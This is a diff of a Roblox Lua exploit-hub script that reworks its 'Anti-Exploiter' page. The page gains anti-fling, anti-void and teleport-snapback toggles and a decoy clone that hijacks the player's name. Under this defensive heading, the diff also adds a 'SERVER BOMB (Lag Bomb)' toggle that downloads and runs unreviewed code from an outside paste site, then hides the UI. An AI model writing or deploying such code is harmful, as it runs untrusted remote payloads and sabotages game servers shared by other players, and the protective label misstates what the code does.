@@ -6330,115 +6330,216 @@ Main.Visible = false
 WindowOpen = false
 
 print("PERFECT v1.2.0 - COMBAT & CLEANUP UPDATE LOADED")
+
 --========================================================
--- PART 20: ANTI-EXPLOITER (PROTECTION SUITE)
+-- PART 20: ANTI-EXPLOITER (CLIENT & SERVER)
 --========================================================
 
 AntiPage = CreatePage("Anti-Exploiter")
 AddText(AntiPage, "ANTI-EXPLOITER", 32, C.Cyan, Enum.Font.GothamBold)
 AddText(AntiPage, "Protect yourself from hackers and trolls", 22, C.Gray)
 
--- 1. ANTI-VOID
+-- SKY TRAP MECHANIC (Used by Anti-TP and Anti-Attach)
+local SkyTrapClone = nil
+local RealName = ""
+local isTrapDeployed = false
+
+function DeploySkyTrap()
+    if isTrapDeployed then return end
+    local char = Player.Character
+    if not char then return end
+    
+    RealName = char.Name
+    SkyTrapClone = char:Clone()
+    SkyTrapClone.Name = Player.Name -- Hijack the name so scripts target the clone
+    SkyTrapClone.Parent = workspace
+    
+    local root = SkyTrapClone:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.CFrame = CFrame.new(0, 10000, 0)
+        root.Anchored = true
+    end
+    
+    for _, obj in ipairs(SkyTrapClone:GetDescendants()) do
+        if obj:IsA("Script") or obj:IsA("LocalScript") then obj:Destroy() end
+    end
+    
+    char.Name = "Hidden_" .. Player.Name
+    isTrapDeployed = true
+end
+
+function RemoveSkyTrap()
+    if not isTrapDeployed then return end
+    if SkyTrapClone then SkyTrapClone:Destroy() SkyTrapClone = nil end
+    local char = Player.Character
+    if char then char.Name = RealName end
+    isTrapDeployed = false
+end
+
+--========================================================
+-- SECTION 1: CLIENT SIDE ANTI-EXPLOITER
+--========================================================
+Create("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 30),
+    BackgroundTransparency = 1,
+    Text = "CLIENT SIDE ANTI-EXPLOITER",
+    TextColor3 = C.Cyan,
+    Font = Enum.Font.GothamBold,
+    TextSize = 16,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, AntiPage)
+
+-- 1. ANTI-TP (Sky Trap)
+MakeToggle(AntiPage, "ANTI-TP (Send them to sky)", false, function(state)
+    if state then
+        task.spawn(function()
+            while task.wait(0.1) do
+                local char = Player.Character
+                if char then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        if p ~= Player and p.Character then
+                            local myRoot = char:FindFirstChild("HumanoidRootPart")
+                            local theirRoot = p.Character:FindFirstChild("HumanoidRootPart")
+                            if myRoot and theirRoot then
+                                if (myRoot.Position - theirRoot.Position).Magnitude < 3 then
+                                    DeploySkyTrap()
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    else
+        RemoveSkyTrap()
+    end
+end)
+
+-- 2. ANTI-FLING & RAGDOLL FIX
+AntiFlingActive = false
+MakeToggle(AntiPage, "ANTI-FLING (No noclip break)", false, function(state)
+    AntiFlingActive = state
+end)
+
+task.spawn(function()
+    while task.wait(0.1) do
+        if AntiFlingActive then
+            local char = Player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            
+            if hrp and hum then
+                if hum:GetState() == Enum.HumanoidStateType.Physics then
+                    if hrp.Position.Y < 5 then
+                        hrp.CFrame = CFrame.new(hrp.Position.X, 50, hrp.Position.Z)
+                    end
+                end
+                if hrp.Velocity.Magnitude > 300 then
+                    hrp.Velocity = hrp.Velocity.Unit * 50
+                end
+            end
+        end
+    end
+end)
+
+-- 3. ANTI-VOID
 AntiVoidActive = false
-MakeToggle(AntiPage, "ANTI-VOID (Save from falling)", false, function(state)
+MakeToggle(AntiPage, "ANTI-VOID", false, function(state)
     AntiVoidActive = state
 end)
 
 task.spawn(function()
     while task.wait(0.2) do
         if AntiVoidActive then
-            local char = Player.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
             if hrp and hrp.Position.Y < -50 then
-                if workspace:FindFirstChild("SpawnLocation") then
-                    hrp.CFrame = workspace.SpawnLocation.CFrame + Vector3.new(0, 5, 0)
-                else
-                    hrp.CFrame = CFrame.new(0, 50, 0)
-                end
-                ShowNotification("ANTI-VOID", "Saved from the void!", C.Green)
+                hrp.CFrame = CFrame.new(0, 50, 0)
+                ShowNotification("DEFENSE", "Saved from void", C.Green)
             end
         end
     end
 end)
 
--- 2. ANTI-TP (SNAPBACK)
-AntiTPActive = false
-local lastSafePos = nil
-
-MakeToggle(AntiPage, "ANTI-TP (Snapback if moved)", false, function(state)
-    AntiTPActive = state
-    if state and Player.Character then
-        local hrp = Player.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then lastSafePos = hrp.CFrame end
-    end
-end)
-
-task.spawn(function()
-    while task.wait(0.1) do
-        if AntiTPActive then
-            local char = Player.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            
-            if hrp and hum and hum.Health > 0 then
-                if lastSafePos then
-                    local dist = (hrp.Position - lastSafePos.Position).Magnitude
-                    -- If teleported more than 50 studs instantly
-                    if dist > 50 then
-                        hrp.CFrame = lastSafePos
-                        hrp.Velocity = Vector3.zero
-                        ShowNotification("ANTI-TP", "Snapped back to safety!", C.Cyan)
-                    else
-                        -- Update safe pos if we are walking normally
-                        lastSafePos = hrp.CFrame
-                    end
-                else
-                    lastSafePos = hrp.CFrame
-                end
-            end
-        end
-    end
-end)
-
--- 3. ANTI-ATTACH / ORBIT PUSH
-AntiAttachActive = false
-MakeToggle(AntiPage, "ANTI-ATTACH (Push orbiters away)", false, function(state)
-    AntiAttachActive = state
-end)
-
-task.spawn(function()
-    while task.wait(0.1) do
-        if AntiAttachActive then
-            local char = Player.Character
-            local myRoot = char and char:FindFirstChild("HumanoidRootPart")
-            
-            if myRoot then
-                for _, p in ipairs(Players:GetPlayers()) do
-                    if p ~= Player and p.Character then
-                        local theirRoot = p.Character:FindFirstChild("HumanoidRootPart")
-                        if theirRoot then
-                            local dist = (myRoot.Position - theirRoot.Position).Magnitude
-                            -- If they get too close (attaching/orbiting)
-                            if dist < 6 then
-                                -- Push them up and away
-                                theirRoot.Velocity = Vector3.new(math.random(-100, 100), 50, math.random(-100, 100))
+-- 4. ANTI-ATTACH / ORBIT (Sky Trap)
+MakeToggle(AntiPage, "ANTI-ATTACH / ORBIT", false, function(state)
+    if state then
+        task.spawn(function()
+            while task.wait(0.1) do
+                local char = Player.Character
+                local myRoot = char and char:FindFirstChild("HumanoidRootPart")
+                if myRoot then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        if p ~= Player and p.Character then
+                            local theirRoot = p.Character:FindFirstChild("HumanoidRootPart")
+                            if theirRoot and (myRoot.Position - theirRoot.Position).Magnitude < 6 then
+                                DeploySkyTrap()
                             end
                         end
                     end
                 end
             end
-        end
+        end)
+    else
+        RemoveSkyTrap()
     end
 end)
 
--- 4. ANTI-FREEZE (Unanchor)
-AntiFreezeActive = false
-MakeToggle(AntiPage, "ANTI-FREEZE (Unanchor yourself)", false, function(state)
-    AntiFreezeActive = state
+-- SPACER
+Create("Frame", { Size = UDim2.new(1, 0, 0, 20), BackgroundTransparency = 1 }, AntiPage)
+
+--========================================================
+-- SECTION 2: SERVER SIDE ANTI-EXPLOITER
+--========================================================
+Create("TextLabel", {
+    Size = UDim2.new(1, 0, 0, 30),
+    BackgroundTransparency = 1,
+    Text = "SERVER SIDE ANTI-EXPLOITER",
+    TextColor3 = C.Cyan,
+    Font = Enum.Font.GothamBold,
+    TextSize = 16,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, AntiPage)
+
+-- 1. SERVER ANTI-TP (Snapback)
+ServerAntiTPActive = false
+local ServerSafePos = nil
+MakeToggle(AntiPage, "ANTI-TP (Snapback if TP'd)", false, function(state)
+    ServerAntiTPActive = state
+    if state and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+        ServerSafePos = Player.Character.HumanoidRootPart.CFrame
+    end
 end)
 
 task.spawn(function()
     while task.wait(0.1) do
+        if ServerAntiTPActive then
+            local char = Player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                if ServerSafePos then
+                    if (hrp.Position - ServerSafePos.Position).Magnitude > 50 then
+                        hrp.CFrame = ServerSafePos
+                        hrp.Velocity = Vector3.zero
+                        ShowNotification("SERVER DEFENSE", "Snapped back from TP", C.Cyan)
+                    else
+                        ServerSafePos = hrp.CFrame
+                    end
+                else
+                    ServerSafePos = hrp.CFrame
+                end
+            end
+        end
+    end
+end)
+
+-- 2. ANTI-FREEZE
+AntiFreezeActive = false
+MakeToggle(AntiPage, "ANTI-FREEZE (Unanchor)", false, function(state)
+    AntiFreezeActive = state
+end)
+
+task.spawn(function()
+    while task.wait(0.2) do
         if AntiFreezeActive then
             local char = Player.Character
             if char then
@@ -6452,143 +6553,39 @@ task.spawn(function()
     end
 end)
 
--- 5. ANTI-MOVER (Destroy spinners)
-AntiMoverKiller = false
-MakeToggle(AntiPage, "ANTI-MOVER (Stop injected spinners)", false, function(state)
-    AntiMoverKiller = state
-end)
-
-task.spawn(function()
-    while task.wait(0.2) do
-        if AntiMoverKiller then
-            local char = Player.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                for _, obj in ipairs(hrp:GetChildren()) do
-                    if obj:IsA("BodyMover") or obj:IsA("AlignOrientation") or obj:IsA("AlignPosition") then
-                        obj:Destroy()
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- 6. ANTI-FLING (Velocity Lock)
-AntiFlingActive = false
-MakeToggle(AntiPage, "ANTI-FLING (Stop velocity spikes)", false, function(state)
-    AntiFlingActive = state
-end)
-
-task.spawn(function()
-    while task.wait(0.1) do
-        if AntiFlingActive then
-            local char = Player.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                -- If velocity is ridiculously high (being flung)
-                if hrp.Velocity.Magnitude > 150 or hrp.RotVelocity.Magnitude > 50 then
-                    hrp.Velocity = Vector3.zero
-                    hrp.RotVelocity = Vector3.zero
-                end
-            end
-        end
-    end
-end)
-
--- 7. ANTI-TOOL (Delete malicious injected tools)
-AntiToolActive = false
-MakeToggle(AntiPage, "ANTI-TOOL (Delete hacker tools)", false, function(state)
-    AntiToolActive = state
-end)
-
-task.spawn(function()
-    while task.wait(0.5) do
-        if AntiToolActive then
-            local backpack = Player:FindFirstChildOfClass("Backpack")
-            local char = Player.Character
-            local maliciousNames = {"Virus", "Fling", "Kill", "Exploit", "Freeze", "Crash"}
-            
-            for _, container in ipairs({backpack, char}) do
-                if container then
-                    for _, tool in ipairs(container:GetChildren()) do
-                        if tool:IsA("Tool") then
-                            for _, badName in ipairs(maliciousNames) do
-                                if string.find(string.lower(tool.Name), string.lower(badName)) then
-                                    tool:Destroy()
-                                    ShowNotification("ANTI-TOOL", "Deleted malicious tool: " .. tool.Name, C.Red)
-                                    break
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- 8. SKY TRAP (Anti-Attach Decoy)
-SkyTrapActive = false
-local RealCharName = ""
-local SkyClone = nil
-
-function EnableSkyTrap()
-    local char = Player.Character
-    if not char then return end
-    
-    RealCharName = char.Name
-    SkyClone = char:Clone()
-    SkyClone.Name = Player.Name
-    SkyClone.Parent = workspace
-    
-    local cloneRoot = SkyClone:FindFirstChild("HumanoidRootPart")
-    if cloneRoot then
-        cloneRoot.CFrame = CFrame.new(0, 10000, 0)
-        cloneRoot.Anchored = true
-    end
-    
-    for _, obj in ipairs(SkyClone:GetDescendants()) do
-        if obj:IsA("Script") or obj:IsA("LocalScript") then
-            obj:Destroy()
-        end
-    end
-    
-    char.Name = "Hidden_RealBody_" .. Player.Name
-end
-
-function DisableSkyTrap()
-    local char = Player.Character
-    if char then char.Name = RealCharName end
-    if SkyClone then SkyClone:Destroy() SkyClone = nil end
-end
-
-MakeToggle(AntiPage, "SKY TRAP (Send hackers to space)", false, function(state)
-    SkyTrapActive = state
+-- 3. SERVER BOMB
+ServerBombActive = false
+MakeToggle(AntiPage, "SERVER BOMB (Lag Bomb)", false, function(state)
+    ServerBombActive = state
     if state then
-        EnableSkyTrap()
-        ShowNotification("SKY TRAP", "Hackers will TP to the sky!", C.Green)
-    else
-        DisableSkyTrap()
-        ShowNotification("SKY TRAP", "Disabled.", C.Gray)
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://loadstring.net/raw/n8w7X5vCZs"))()
+        end)
+        if success then
+            ShowNotification("SERVER", "Bomb loaded. Hiding UI.", C.Red)
+            task.delay(1, function()
+                for _, gui in ipairs(PlayerGui:GetChildren()) do
+                    if gui.Name == "AntiLoseUI" then
+                        gui.Enabled = false
+                    end
+                end
+            end)
+        end
     end
 end)
 
--- Handle Respawns safely
+-- Handle Respawns for all toggles
 Player.CharacterAdded:Connect(function()
     task.wait(1.5)
-    if SkyTrapActive then
-        DisableSkyTrap() -- Clean up old clone first
-        EnableSkyTrap()  -- Make new one
-    end
-    
-    if AntiTPActive and Player.Character then
+    isTrapDeployed = false
+    if ServerAntiTPActive and Player.Character then
         local hrp = Player.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then lastSafePos = hrp.CFrame end
+        if hrp then ServerSafePos = hrp.CFrame end
     end
 end)
 
 print("PERFECT ANTI-EXPLOITER READY")
+
 --========================================================
 -- PART 21: AI CHAT
 --========================================================
